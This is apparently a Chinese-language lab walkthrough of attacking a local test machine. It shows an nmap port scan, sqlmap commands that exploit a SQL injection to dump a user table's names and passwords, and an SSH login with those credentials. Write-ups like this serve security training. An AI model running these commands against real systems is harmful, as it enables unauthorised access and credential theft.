# 0x00环境

攻击机IP：192.168.1.10  
目标机IP：192.168.1.7

# 0x01实战

## 端口扫描

```
nmap -Pn -sV -A 192.168.1.7
```

![](../Images/9c9554f3f5de44947c9945403db0c950.png)

可以看到开放的端口有22-SSH、25-SMTP、80-HTTP。

## 漏洞发现

既然开放了80端口，那当然是先去看看80端口

![](../Images/8d689d2f49214a74e87c2f7a17e1b54e.png)

  

  

在浏览网页的过程中发现可能存在SQL注入的一个URL

```
http://192.168.1.7/index.html?page=blog&title=Blog&id=2
```

![](../Images/414ae4f137d413d58e0a8b49fce4169c.png)

  

  

## 漏洞利用

使用SQLMAP扫描

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2"
```

![](../Images/edaa6efbc839b2ae5fef95af4624a421.png)

  

果然存在SQL注入  

  

爆库

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" --dbs
```

![](../Images/cf536efdfae217f893ecef70272a7573.png)

  

  

在爆表的过程中发现在ehks库中存在user表

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks --tables
```

![](../Images/21ef25ef0d85eb83a7e164dd97a1220f.png)

  

  

爆表

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks -T user --columns
```

![](../Images/8931b03df85a98f828e32cbfc5df493d.png)

  

  

爆user\_name和user\_pass字段

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks -T user -C user_name,user_pass --dump
```

  

得到一些账号和密码

![](../Images/3c2c5304a70cc0bc24148c8df4322f81.png)

  

  

在前面的端口扫描中我们发现开放了22-SSH端口，尝试连接，连接成功！

![](../Images/b6b02c62f4b87f220835c5b4f771b378.png)
